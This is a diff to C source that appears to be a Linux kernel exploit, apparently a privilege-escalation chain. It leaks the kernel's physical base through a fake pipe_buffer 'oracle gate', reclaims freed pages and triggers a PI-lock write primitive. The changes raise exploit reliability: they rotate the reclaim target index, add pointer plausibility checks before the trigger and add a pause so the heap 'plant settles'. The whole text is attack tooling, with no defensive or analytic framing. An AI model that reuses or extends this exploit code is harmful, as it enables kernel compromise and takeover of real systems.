@@ -727,9 +727,10 @@ static int slide_leak_physical_base(void) {
   }
   uintptr_t gate_target =
       pipebuf_page_base +
-      (uintptr_t)P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-  pr_info("p0 physical pre-mm pipebuf=%016zx gate_target=%016zx\n",
-          pipebuf_page_base, gate_target);
+      (uintptr_t)g_p0_gate_object_index * PIPE_OBJECT_SIZE;
+  pr_info("p0 physical pre-mm pipebuf=%016zx gate_target=%016zx "
+          "gate_index=%d\n",
+          pipebuf_page_base, gate_target, g_p0_gate_object_index);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
   if (!page_base) {
     return 0;
@@ -740,25 +741,56 @@ static int slide_leak_physical_base(void) {
              page_base, pipebuf_page_base);
     return 0;
   }
+  uintptr_t page_struct = direct_to_page(page_base);
+  if (!is_plausible_page_struct(page_struct) ||
+      !is_plausible_page_struct(slide_oracle_parent)) {
+    pr_error("p0 physical abort: bad page_struct mm=%016zx "
+             "oracle_parent=%016zx\n",
+             page_struct, slide_oracle_parent);
+    return 0;
+  }
+  if (!is_direct_ptr(slide_oracle_target) ||
+      !is_direct_ptr(slide_oracle_target + sizeof(struct user_pipe_buffer) - 1)) {
+    pr_error("p0 physical abort: oracle_target not direct "
+             "target=%016zx gate_index=%d\n",
+             slide_oracle_target, g_p0_gate_object_index);
+    return 0;
+  }
   pr_info("p0 physical pre-PI mm=%016zx page_struct=%016zx "
           "oracle_parent=%016zx oracle_target=%016zx fake_lock=%016zx "
-          "delta=%lld\n",
-          page_base, direct_to_page(page_base), slide_oracle_parent,
-          slide_oracle_target, fake_lock, (long long)g_skb_data_delta);
+          "delta=%lld gate_index=%d empty_pi_waiters=%d\n",
+          page_base, page_struct, slide_oracle_parent,
+          slide_oracle_target, fake_lock, (long long)g_skb_data_delta,
+          g_p0_gate_object_index,
+#if defined(SLIDE_EMPTY_FAKE_TASK_PI_WAITERS) && SLIDE_EMPTY_FAKE_TASK_PI_WAITERS
+          1
+#else
+          0
+#endif
+  );
+  /* Brief quiet after reclaim so the plant settles before PI/write. */
+  usleep(50000);
+  for (int q = 0; q < 4; q++) {
+    sched_yield();
+  }
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
-    pr_error("p0 physical pipe gate trigger failed\n");
+    pr_error("p0 physical pipe gate trigger failed gate_index=%d\n",
+             g_p0_gate_object_index);
     return 0;
   }
   int gate_result = verify_p0_pipe_oracle_gate();
   if (getenv("P0_ORACLE_GATE_DIAG")) {
-    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+    pr_info("p0 physical gate diagnostic result=%d gate_index=%d\n",
+            gate_result, g_p0_gate_object_index);
     if (gate_result != 0) {
       slide_restore_physical_oracle();
     }
     return 0;
   }
   if (gate_result == 0) {
-    pr_warning("p0 physical pipe reclaim miss\n");
+    pr_warning("p0 physical pipe reclaim miss gate_index=%d "
+               "target=%016zx (will rotate index next attempt)\n",
+               g_p0_gate_object_index, slide_oracle_target);
     return 0;
   }
   app_publish_p0_dirty();
@@ -857,7 +889,7 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
   uintptr_t parent = direct_to_page(payload_base);
   uintptr_t target = pipebuf_page_base +
-                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+                     (uintptr_t)g_p0_gate_object_index * PIPE_OBJECT_SIZE;
   static const char marker[] = "RMG-P0-ORACLE-GATE";
   uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
   if (getenv("P0_ORACLE_READ_DIAG")) {
